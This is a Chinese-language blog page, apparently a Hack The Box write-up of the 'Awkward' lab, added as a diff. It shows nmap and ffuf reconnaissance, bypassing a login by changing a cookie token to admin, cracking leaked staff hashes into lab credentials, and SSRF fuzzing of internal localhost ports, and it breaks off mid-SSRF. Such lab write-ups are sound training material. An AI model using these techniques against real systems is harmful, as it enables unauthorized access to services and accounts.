@@ -1,0 +1,1261 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Awkward - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Awkward靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.11.185 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-03-11 01:55 CST Nmap scan r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Awkward - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Awkward靶场信息  靶场类型  信息收集Nmap┌──(root㉿kali)-[~&#x2F;Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.11.185 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-03-11 01:55 CST Nmap scan r">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/qHn3xqiYXz4ZPgf3GJ-T9aWJi1KEis5-ALZN7xlT4Wg.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/SdXchWAqoVujsjsuvkhGk1ZOCGEQBpynHobXTF5tTSk.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/s2ADAkE-yRjmVY6jcJUpfrNgAeL5baPuLooeftSi52s.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/8a9z15RXHkRXEcsxx7byXob8h1cSMJkFUQwb6KqyfMU.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/j5ZGICk1xYW72GWIQs9WnRghOrrqRS_ATcJVBEXuwMg.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/-BwOtHLOeLyy50Rv5iKDsejC7_bYKTE258Yoh3yXcjs.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/2u8cLEOiKzUpbjL_JAEHrS-gZ-PKZChX3CVaV-JbKig.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/ltD-Te3zqjpYgYmBKiGzgU1UxmuwnkAvXvRO9S3V6tc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/n6XAUDBfSXnWrAT3xXtmUS2Dfs8mH6pZDgI5PHA6eSQ.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/6Ju9QTts9sHbU-d1k6BNxqv-Bx6ONQg0Gp7nZOWamww.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/FIn97059GEfYnGZ1ys0rVr1COWAiVNZxrclWJ9C5WIw.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/fUgz-Z8M1YDOGCsVCt4yemb1NpaLxhb3NcSA-6MQwPg.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/vVvVIC59OQRwu_OeVmjihwsU4UpheMSBBQ3os-Cg5Hg.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/qrKPSzIAFIgZWKvg-OHYNqJK-WCQLk_nBrbKOINZ5PY.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/ylHHETQieALkMiXqdgHvo8oAq3Pwjvvno11gripTPq4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/iy3HWs9a4ANUgIHySTW6s603YQwChIlf9o5tAOPSnZw.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/UGyOtuz4HOOqc5TxSzfJY7Zlp_qTt6Mkfho1iWsC82g.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/-zPUOYKcPXLNRS_SkEg4RrApECQwKWUV_1UK4IPu2E0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/ixq6hoCufvKYUC1ZW2TOsW58PWVDMYs-0sLM54nKVnI.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/hVWqIl5JU58WsJDCmMGnTEQBDnXqClV-TitZyXNEje4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/jv_20INiPgVbrlp3FRYyZHwtklfwxugK227WvxWMbUo.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/qV0Ue07IjR14am1u1aKIIooiBFkQY5uO1Ky1qX4IM74.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/3lmX3BPWnjKtiD3MSe1h-dHJdJBJhjopXczCaJ9CpP0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/RQJrPbAxTdvycj6hIf0wvnvPePy5ArRrraGZyR0fXgk.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/Cyc38LvM7oUkPlO17iHJS4Lv2kdGKa64EO8odaxI2ig.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/9K65eo5piospxqpwE42bSLhIb46aQiunURAzYsVPRJA.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/h7OqA_sXJdmZFBxNvhn15FAHKB7GAVPPOjzzh2sBNQ0.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/w4xE8GRniDaZ555NGGjxG7k93o5vOMK_xI-1wrM-xBE.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/KYqHRotuHTuY2rpPIxX8gqZRLC1495Wsi3qTqpLcWxs.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/3oUIuzXPTBfkS_5VW2BUWSPDKeieNH2Wtx79zXp1ouE.png">
+<meta property="og:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/c2kb5YS27NqycwXtnWllo20DaFGqjJTSp7368GOkJ8Y.png">
+<meta property="article:published_time" content="2023-03-12T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:40:11.451Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2023/03/12/Hackthebox/Hackthebox-Awkward/qHn3xqiYXz4ZPgf3GJ-T9aWJi1KEis5-ALZN7xlT4Wg.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Awkward - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Awkward - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-03-12T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2023-03-12
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Awkward"><span class="post-toc-text">Hackthebox - Awkward</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz"><span class="post-toc-text">Fuzz</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#寻找突破点"><span class="post-toc-text">寻找突破点</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Fuzz-1"><span class="post-toc-text">Fuzz</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#JWT-Token-利用"><span class="post-toc-text">JWT Token 利用</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Awkward"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Awkward - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-03-12 19:38:36" datetime="2023-03-12T11:38:36.000Z"  itemprop="datePublished">2023-03-12</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Awkward"><a href="#Hackthebox-Awkward" class="headerlink" title="Hackthebox - Awkward"></a>Hackthebox - Awkward</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/qHn3xqiYXz4ZPgf3GJ-T9aWJi1KEis5-ALZN7xlT4Wg.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/SdXchWAqoVujsjsuvkhGk1ZOCGEQBpynHobXTF5tTSk.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.11.185
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-11 01:55 CST
+Nmap scan report for 10.10.11.185
+Host is up (0.083s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 7254afbaf6e2835941b7cd611c2f418b (ECDSA)
+|_  256 59365bba3c7821e326b37d23605aec38 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=3/11%OT=22%CT=1%CU=37953%PV=Y%DS=2%DC=T%G=Y%TM=640B6F2
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
+OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1
+OS:1NW7%O6=M537ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
+OS:(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
+OS:=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT      ADDRESS
+1   74.06 ms 10.10.16.1
+2   75.37 ms 10.10.11.185
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.82 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><p>这边 web 页面指向域名 <code>hat-valley.htb</code> ，去做一个 hosts 解析</p>
+<pre><code class="bash">echo 10.10.11.185 hat-valley.htb &gt;&gt; /etc/hosts
+</code></pre>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/s2ADAkE-yRjmVY6jcJUpfrNgAeL5baPuLooeftSi52s.png" class>
+
+<p>似乎是一个什么商城之类的，做找下有没有什么可用信息</p>
+<h2 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ffuf -u &quot;http://hat-valley.htb/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200  
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://hat-valley.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 200
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 404ms]
+static                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 386ms]
+js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 356ms]
+                        [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 98ms]
+:: Progress: [30000/30000] :: Job [1/1] :: 743 req/sec :: Duration: [0:00:54] :: Errors: 2 ::
+</code></pre>
+<p>跑了一下目录，没什么有用的东西，去跑一下子域名</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ffuf -H &quot;Host:FUZZ.hat-valley.htb&quot; -w &quot;/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt&quot; -u &quot;http://hat-valley.htb/&quot; -t 200 -fs 132
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://hat-valley.htb/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.hat-valley.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 200
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 132
+________________________________________________
+
+store                   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 76ms]
+:: Progress: [114441/114441] :: Job [1/1] :: 2296 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
+</code></pre>
+<p>发现一个子域名 <code>store</code> ，去加入一下 hosts 解析</p>
+<pre><code class="bash">echo 10.10.11.185 store.hat-valley.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>然后去访问一下</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/8a9z15RXHkRXEcsxx7byXob8h1cSMJkFUQwb6KqyfMU.png" class>
+
+<p>提示需要登录，尝试了一下弱口令没有成功，并且 fuzz 了一下也没有可以访问的地址，都是 401</p>
+<p>把目光放回到主页面，我们继续 fuzz 下去</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ffuf -u &quot;http://hat-valley.htb/js/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 -e .js
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://hat-valley.htb/js/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ :: Extensions       : .js 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 200
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+app                     [Status: 200, Size: 150, Words: 6, Lines: 1, Duration: 267ms]
+app.js                  [Status: 200, Size: 430202, Words: 15339, Lines: 1640, Duration: 175ms]
+custom.js               [Status: 200, Size: 8618, Words: 865, Lines: 370, Duration: 135ms]
+custom                  [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 230ms]
+plugin                  [Status: 200, Size: 153, Words: 6, Lines: 1, Duration: 240ms]
+plugin.js               [Status: 200, Size: 899759, Words: 60565, Lines: 18950, Duration: 135ms]
+                        [Status: 200, Size: 14351, Words: 1661, Lines: 366, Duration: 575ms]
+revolution              [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 286ms]
+:: Progress: [60000/60000] :: Job [1/1] :: 564 req/sec :: Duration: [0:01:46] :: Errors: 4 ::
+</code></pre>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/j5ZGICk1xYW72GWIQs9WnRghOrrqRS_ATcJVBEXuwMg.png" class>
+
+<p>在 <code>app.js</code> 中找到了一个指向 hr 的地址，去访问一下</p>
+<p> </p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/-BwOtHLOeLyy50Rv5iKDsejC7_bYKTE258Yoh3yXcjs.png" class>
+
+<p>有一个登陆页面，但测试了一下弱口令没成功</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="寻找突破点"><a href="#寻找突破点" class="headerlink" title="寻找突破点"></a>寻找突破点</h2><img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/2u8cLEOiKzUpbjL_JAEHrS-gZ-PKZChX3CVaV-JbKig.png" class>
+
+<p>查看 <code>Cookie</code> 中，发现有一个 token 值是 guest，给它改成 admin 试试</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/ltD-Te3zqjpYgYmBKiGzgU1UxmuwnkAvXvRO9S3V6tc.png" class>
+
+<p>就直接登录了</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/n6XAUDBfSXnWrAT3xXtmUS2Dfs8mH6pZDgI5PHA6eSQ.png" class>
+
+<p>这里有个请假申请，但是点了没有反应？抓个包看看</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/6Ju9QTts9sHbU-d1k6BNxqv-Bx6ONQg0Gp7nZOWamww.png" class>
+
+<p>直接 500 了</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/FIn97059GEfYnGZ1ys0rVr1COWAiVNZxrclWJ9C5WIw.png" class>
+
+<p>在这里发现了两个接口</p>
+<pre><code class="bash">api/store-status
+api/staff-details
+</code></pre>
+<p>分别去访问一下呢</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/fUgz-Z8M1YDOGCsVCt4yemb1NpaLxhb3NcSA-6MQwPg.png" class>
+
+<p>似乎是 JWT 令牌的问题，而 JWT 令牌是必须登录后才有的，但我们现在是通过未授权访问（还是越权？）来进行登录的，所以没有 JWT 令牌。</p>
+<p>所以我们现在去退出登录再访问这个页面试试看</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/vVvVIC59OQRwu_OeVmjihwsU4UpheMSBBQ3os-Cg5Hg.png" class>
+
+<p>我发现我的思路错了，退出登录后还是回有一个 cookie，所以直接删除 cookie 试试</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/qrKPSzIAFIgZWKvg-OHYNqJK-WCQLk_nBrbKOINZ5PY.png" class>
+
+<p>所以我们直接得到了一些账号密码</p>
+<p>使用 <code>crack station</code> 来进行破解</p>
+<blockquote>
+<p><a href="https://crackstation.net/" target="_blank" rel="noopener">https://crackstation.net/</a></p>
+</blockquote>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/ylHHETQieALkMiXqdgHvo8oAq3Pwjvvno11gripTPq4.png" class>
+
+<p>得到了一个账号密码</p>
+<pre><code class="bash">username = christopher.jones
+password = chris123
+</code></pre>
+<p>然后我们去 hr 页面登录</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/iy3HWs9a4ANUgIHySTW6s603YQwChIlf9o5tAOPSnZw.png" class>
+
+<p>登录成功</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/UGyOtuz4HOOqc5TxSzfJY7Zlp_qTt6Mkfho1iWsC82g.png" class>
+
+<p>然后我们拿到了 JWT Token</p>
+<pre><code class="bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjc4NTUxNDU3fQ.Baca0KhSUCTjcZiDINY0mVs1Tndg78RGwXWLMpwjuZ8
+</code></pre>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/-zPUOYKcPXLNRS_SkEg4RrApECQwKWUV_1UK4IPu2E0.png" class>
+
+<p>使用 <code>jwt.io</code> 访问，可以看到内容相当的简单</p>
+<p>但是我在四个用户列表中没有看到什么明显的是管理员的东西</p>
+<p>不过 <code>Christine Wool</code> 似乎是 CEO，但是 JWT 令牌伪造比较麻烦，而且我看了下靶场类型，偏向于 <code>Custom Exploitation</code> ，这看着很像是兔子洞</p>
+<p>所以我们换个思路</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/ixq6hoCufvKYUC1ZW2TOsW58PWVDMYs-0sLM54nKVnI.png" class>
+
+<p>来到首页，我们点击刷新，抓这个刷新的包看看</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/hVWqIl5JU58WsJDCmMGnTEQBDnXqClV-TitZyXNEje4.png" class>
+
+<p>请求的包有点奇怪</p>
+<p>这个包指向了子域名 store</p>
+<img src="/2023/03/12/Hackthebox/Hackthebox-Awkward/jv_20INiPgVbrlp3FRYyZHwtklfwxugK227WvxWMbUo.png" class>
+
+<p>ok，这很明显是一个 SSRF 了，我们来 fuzz 一下</p>
+<h2 id="Fuzz-1"><a href="#Fuzz-1" class="headerlink" title="Fuzz"></a>Fuzz</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ffuf -u &#39;http://hat-valley.htb/api/store-status?url=&quot;http://localhost:FUZZ&quot;&#39; -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -fs 0 
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://hat-valley.htb/api/store-status?url=&quot;http://localhost:FUZZ&quot;
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0
+________________________________________________
+
+0080                    [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 290ms]
+3002                    [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 142ms]
+8080                    [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 170ms]
+:: Progress: [10000/10000] :: Job [1/1] :: 193 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
+</code></pre>
+<p>这里的 3002 和 8080 都是我们没有见过的，比较奇怪的，并且有东西的</p>
+<p>而 3002 的 size 居然有 77010 个，明显不对，我们去看一下</p>
